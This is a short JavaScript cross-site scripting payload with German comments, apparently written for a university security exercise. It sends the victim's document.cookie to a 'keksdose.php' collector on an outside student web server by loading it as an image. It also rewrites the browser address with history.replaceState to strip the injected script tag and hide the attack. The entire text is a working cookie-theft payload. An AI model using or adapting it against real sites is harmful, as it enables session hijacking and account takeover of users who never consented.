// HIER ÄNDERN
var url = 'https://studi.f4.htw-berlin.de/~s0543210/keksdose.php';

// Ersetze die aktuelle URL durch eine saubere Version, um den Angriff zu verschleiern
history.replaceState({}, '', location.href.replace(/%3Cscript.*script%3E/, ''));

// Lade die Keksdose als Bild und übergib den Cookie als Parameter in der URL
new Image().src = url + '?cookie=' + document.cookie;
